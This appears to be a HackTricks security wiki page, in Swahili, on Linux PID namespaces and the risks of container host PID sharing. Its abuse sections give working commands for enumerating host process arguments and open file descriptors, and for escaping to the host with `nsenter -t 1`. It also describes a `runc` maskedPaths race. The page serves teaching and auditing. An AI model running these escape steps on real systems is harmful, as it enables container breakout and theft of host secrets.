# Namespace ya PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

PID namespace inadhibiti jinsi michakato inapangiwa nambari na ni michakato gani inayoonekana. Hii ndiyo sababu container inaweza kuwa na PID 1 yake hata kama si mashine halisi. Ndani ya namespace, workload inaona kile kinachoonekana kama mti wa michakato wa ndani. Nje ya namespace, host bado inaona PID halisi za host na taswira kamili ya michakato.

Kutoka kwa mtazamo wa usalama, PID namespace ni muhimu kwa sababu uonekano wa michakato una thamani. Mara workload inapoona michakato ya host, inaweza kuweza kuona majina ya huduma, hoja za command-line, siri zilizopelekwa kama hoja za mchakato, hali inayotokana na mazingira kupitia `/proc`, na malengo yanayoweza kuingilia namespace. Iwapo inaweza kufanya zaidi ya kuona michakato hiyo, kwa mfano kutuma signals au kutumia ptrace chini ya masharti sahihi, tatizo linakuwa kubwa zaidi.

## Uendeshaji

PID namespace mpya huanza na upangaji wake wa ndani wa nambari za michakato. Mchakato wa kwanza kuundwa ndani yake huwa PID 1 kutoka kwa mtazamo wa namespace, ambayo pia ina maana inapata semantiki maalum kama init kwa watoto waliokosa mzazi na tabia za signals. Hii inaelezea mengi ya ajabu zinazotokea kwenye container kuhusu init processes, zombie reaping, na kwa nini mara nyingine wrapper ndogo za init zimetumika katika container.

Somo muhimu la usalama ni kwamba mchakato unaweza kuonekana umejitenga kwa sababu unaona tu mti wake wa PID, lakini utengwa huo unaweza kuondolewa kwa makusudi. Docker huweka hili kupitia `--pid=host`, wakati Kubernetes inafanya hivyo kupitia `hostPID: true`. Mara container inapoungana na host PID namespace, workload inaona michakato ya host moja kwa moja, na njia nyingi za mashambulizi baadaye zinakuwa za kweli zaidi.

## Maabara

Kuunda PID namespace kwa mikono:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sasa inaona muonekano binafsi wa michakato. Bendera `--mount-proc` ni muhimu kwa sababu ina-mount mfano wa procfs unaolingana na PID namespace mpya, na hivyo kufanya orodha ya michakato thabiti kutoka ndani.

Ili kulinganisha tabia za container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Tofauti ni ya moja kwa moja na rahisi kueleweka, ndiyo maana huu ni maabara nzuri ya kwanza kwa wasomaji.

## Matumizi ya Runtime

Containers za kawaida katika Docker, Podman, containerd, na CRI-O hupata PID namespace yao wenyewe. Kubernetes Pods kwa kawaida pia hupokea mtazamo wa PID uliotengwa isipokuwa workload iombe kwa uwazi kushiriki host PID. Mazingira ya LXC/Incus yanategemea primitive ile ile ya kernel, ingawa matumizi ya system-container yanaweza kufichua miti ya mchakato yenye muundo ngumu zaidi na kuhimiza njia mfupi za debugging.

Suala hilo linafanya kazi kila mahali: ikiwa runtime imechagua kutotenga PID namespace, hiyo ni kupunguzwa kwa makusudi kwa mipaka ya container.

## Misconfigurations

Marekebisho ya kawaida ni host PID sharing. Timu mara nyingi hualitoa kama suluhisho la debugging, monitoring, au urahisi wa usimamizi wa huduma, lakini kila wakati yanapaswa kuchukuliwa kama ubaguzi wa usalama wenye umuhimu. Hata kama container haina primitive ya kuandika kwa michakato ya host mara moja, uwezo wa kuona pekee unaweza kufichua mengi kuhusu mfumo. Mara uwezo kama `CAP_SYS_PTRACE` au ufikaji wa procfs wa manufaa unapoongezwa, hatari inapanuka kwa kiasi kikubwa.

Kosa jingine ni kudhani kwamba kwa sababu workload haiwezi kuua au ptrace michakato ya host kwa default, basi host PID sharing haina madhara. Hitimisho hilo linapuuzia thamani ya enumeration, upatikanaji wa namespace-entry targets, na jinsi PID visibility inavyoungana na udhibiti mwingine uliodhoofishwa.

## Abuse

Iwapo host PID namespace inashirikiwa, mshambuliaji anaweza kuchunguza michakato ya host, kukusanya argument za mchakato, kutambua huduma zinazovutia, kutambua PIDs zinazofaa kwa ajili ya `nsenter`, au kuunganisha PID visibility na haki zinazohusiana na ptrace ili kuingilia host au workloads jirani. Katika baadhi ya kesi, kuona tu mchakato sahihi unaoendelea kwa muda mrefu kunatosha kuunda upya mpango wa shambulio.

Hatua ya kwanza ya vitendo ni kila wakati kuthibitisha kwamba michakato ya host inadhihirika kweli:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Mara PIDs za mwenyeji zinapotambulika, vigezo vya mchakato na malengo ya kuingia kwenye namespace mara nyingi huwa chanzo muhimu zaidi cha taarifa:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ikiwa `nsenter` inapatikana na vibali vya kutosha vinapatikana, jaribu kama mchakato wa host unaoonekana unaweza kutumika kama daraja la namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Hata wakati kuingia kumezuiliwa, kushiriki PID ya mwenyeji tayari ni muhimu kwa sababu inaonyesha mpangilio wa huduma, vipengele vya runtime, na michakato yenye ruhusa za juu inayoweza kulengwa ifuatayo.

Uonekano wa PID ya mwenyeji pia hufanya matumizi mabaya ya file-descriptor yawe halisi zaidi. Ikiwa mchakato wa mwenyeji mwenye ruhusa za juu au workload jirani ana faili nyeti au socket wazi, mshambuliaji anaweza kukagua `/proc/<pid>/fd/` na kutumia tena handle hilo kulingana na umiliki, chaguzi za mount za procfs, na muundo wa huduma ya lengo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Amri hizi ni muhimu kwa sababu zinaonyesha ikiwa `hidepid=1` au `hidepid=2` inapunguza uonekano kati ya michakato na ikiwa viashirio vinavyovutia kwa wazi kama faili za siri zilizofunguliwa, logi, au Unix sockets vinaonekana kabisa.

### Mfano Kamili: host PID + `nsenter`

Kushiriki host PID kunakuwa host escape ya moja kwa moja wakati mchakato pia una ruhusa za kutosha kujiunga na host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ikiwa amri itafanikiwa, mchakato wa container sasa unatekelezwa katika host mount, UTS, network, IPC, na PID namespaces. Athari ni uvunjaji wa usalama wa mwenyeji mara moja.

Hata pale `nsenter` yenyewe ikiwa haipo, matokeo yale yale yanaweza kupatikana kupitia binary ya mwenyeji ikiwa filesystem ya mwenyeji imepachikwa:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Vidokezo vya hivi karibuni vya runtime

Baadhi ya mashambulizi yanayohusiana na PID-namespace si misanidi ya kawaida ya `hostPID: true`, bali mende za utekelezaji za runtime kuhusu jinsi ulinzi wa procfs unavyotumika wakati wa usanidi wa container.

#### Mashindano ya `maskedPaths` kuelekea procfs ya host

Katika matoleo ya `runc` yenye udhaifu, washambuliaji walioweza kudhibiti container image au mzigo wa `runc exec` wangeweza kumshindana awamu ya masking kwa kubadilisha upande wa container wa `/dev/null` na kiungo cha simboli (symlink) kuelekea njia ya procfs yenye nyeti kama `/proc/sys/kernel/core_pattern`. Ikiwa mashindano yangelimfaulu, masked-path bind mount inaweza kuishia kwenye lengo lisilo sahihi na kufichua host-global procfs knobs kwa container mpya.

Amri muhimu ya ukaguzi:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Hii ni muhimu kwa sababu athari ya mwisho inaweza kuwa sawa na kufichuliwa moja kwa moja kwa procfs: `core_pattern` au `sysrq-trigger` inayoweza kuandikwa, ikifuatiwa na host code execution au denial of service.

#### Kuingiza namespace kwa kutumia `insject`

Vifaa vya kuingiza namespace kama `insject` vinaonyesha kwamba mwingiliano na PID-namespace hauhitaji kila mara kuingia awali kwenye namespace lengwa kabla ya kuunda mchakato. Msaidizi anaweza kuambatisha baadaye, kutumia `setns()`, na kutekeleza huku akihifadhi uonekaji ndani ya nafasi ya PID lengwa:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Aina hii ya mbinu ina umuhimu hasa kwa advanced debugging, offensive tooling, na post-exploitation workflows ambapo namespace context lazima iunganishwe baada runtime tayari imeanzisha workload.

### Related FD Abuse Patterns

Mifano miwili inastahili kutajwa wazi wakati host PIDs zinaonekana. Kwanza, process yenye privileges inaweza kuendelea kushikilia file descriptor nyeti wazi kupitia `execve()` kwa sababu haikuwekwa `O_CLOEXEC`. Pili, services zinaweza kupitisha file descriptors kupitia Unix sockets kwa `SCM_RIGHTS`. Katika kila kesi, kitu kinachovutia si tena pathname, bali handle tayari wazi ambayo process yenye lower-privilege inaweza kuirithi au kuipokea.

Hii ni muhimu katika kazi za container kwa sababu handle inaweza kuashiria `docker.sock`, privileged log, host secret file, au kitu kingine cha thamani kubwa hata wakati path yenyewe haifikiki moja kwa moja kutoka container filesystem.

## Checks

Lengo la amri hizi ni kubaini ikiwa process ina private PID view au ikiwa tayari inaweza ku-enumerate mandhari pana ya processes.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Kinachovutia hapa:

- Ikiwa orodha ya michakato ina host services zinazoonekana wazi, host PID sharing huenda tayari iko katika matumizi.
- Kuonekana kwa mti mdogo wa container-local pekee ndilo kawaida; kuona `systemd`, `dockerd`, au daemons zisizohusiana sio kawaida.
- Mara host PIDs zinapoonekana, hata taarifa za michakato za read-only zinakuwa reconnaissance yenye manufaa.

Ikiwa unagundua container inayotekelezwa kwa host PID sharing, usiitazame kama tofauti ya uso tu. Ni mabadiliko makubwa katika kile workload inaweza kukiona na kuathiri.
{{#include ../../../../../banners/hacktricks-training.md}}
